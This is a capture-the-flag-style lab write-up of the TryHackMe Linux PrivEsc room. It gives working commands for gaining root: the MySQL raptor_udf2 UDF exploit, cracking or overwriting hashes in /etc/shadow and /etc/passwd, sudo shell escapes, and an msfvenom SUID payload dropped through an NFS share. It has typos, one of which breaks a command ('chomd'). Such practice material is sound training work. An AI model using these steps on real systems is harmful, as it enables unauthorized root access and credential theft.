# What is privilege escalation?

- At it's core, Privilege Escalation usually involves going from a lower permission account to a higher permission one. More technically, it's the exploitation of a vulnerability, design flaw, or configuration oversight in an operating system or application to gain unauthorized access to resources that are usually restricted from the users.

## Importance

It's rare when performing a real-world penetration test to be able to gain a foothold (initial access) that gives you direct administrative access. Privilege escalation is cricual because it lets you gain system administrator levels of access, which allows you to perform actions such as:
Install, uninstall applications, add user, deactivate user, run admin scripts and other administrative tasks.

We will use the tryhackme [Linux PrivEsc](https://tryhackme.com/room/linuxprivesc) for our privilege escalation practice.

## Service Exploits

From the ```ps -ef``` command we get to know that mysql is running under root user and root user doesn't have a password. We can use a [popular exploit](https://www.exploit-db.com/exploits/1518) that takes advantage of User Defined Functions (UDFs) to run system commands as root via the MySQL service.

Change into the ```/home/user/tools/mysql-udf``` directory then compile the raptor_udf2.c exploit code using the following command:

```bash
cd /home/user/tools/mysql-udf
gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```

Connect to the MySQL service as teh root user with a blank password:

```bash
mysql -u root
```

Execute the following commands on the MySQL shell to create a User Defined Function (UDF) "do_system" using our compiled exploit:

```sql
use mysql;
create table foo(line blob);
insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
```

Copy **/bin/bash** to **/tmp/tbash** and set the SUID permission.

```sql
select do_system('cp /bin/bash /tmp/tbash; chomd +xs /tmp/tbash');
```

Exit out of mysql shell and execute ```/tmp/tbash -p``` command and you should get the root shell.

## Weak File permissions - Readable /etc/shadow

We can see that /etc/shadow is world readable in this machine so we can easily grab the root password hash and break it using john the repear.

```bash
$cat /etc/shadow
$john --wordlist=/usr/share/wordlists/rockyou.txt root.hash
```

## Weak file permissions - Writable /etc/shadow

In this VM /etc/shadow is also world writable. Let's generate a password hash with a password of your choice:

```bash
$mkpasswd -m sha-512 pass123
```

Edit the /etc/shadow file and replace the original root user's password hash with the one you just generated. Then switch to root user.

```bash
$su - root
```

## Weak file permissions - Writable /etc/passwd

The /etc/passwd file contains information about user accounts. It is world-readable, but usually only writable by the root user. Historically, the /etc/passwd file contained user password hashes, and some versions of Linux will stilll allow password hashes to be stored there.

The /etc/passwd file is world writable in this VM so we can try to use it.

```bash
$openssl passwd pass321
```

Let's edit the /etc/passwd file and place the generated password hash between the first and second colon (:) of the root user's row replacing the "x".

Alternatively, copy the root user's row and append it to the bottom of the file, changing the first instance of the word "root" to "newroot" and placing the generated password hash between the first and second colon (replacing "x").

The ```su newroot``` to switch to newroot user.

## Privilege Escalation - Shell escapes

There are 11 binaries that the user can run as sudo without requiring any password. Namely, iftop, find, nano, vim, man, awk, less, ftp, nmap, apache2, more. Among them only apache2 doesn't have a way to escape. We may use others to shell escape.

We can look for a way to escape shell [here](https://gtfobins.github.io)

## NFS

Files created via NFS inherit the remote user's ID. If the user is root, and root squasing is enabled, the ID will instead be set to "nobody" user.

Note that /tmp share has root squasing disabled.
On your kali box switch to your root user if you are not already running as root.

Using kali root user, create a mount point on your kali box and mount the /tmp share.

```bash
#mkdir /tmp/nfs
#mount -o rw,vers=3 Target_ip:/tmp /tmp/nfs
```

Still using Kali's root user, generate a payload using msfvenom and save it to the share (this payload simply calls /bin/bash):

```bash
#msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
#chmod +xs /tmp/nfs/shell.elf
Back on target VM
$/tmp/shell.elf
```

You should be able to get the root shell now.


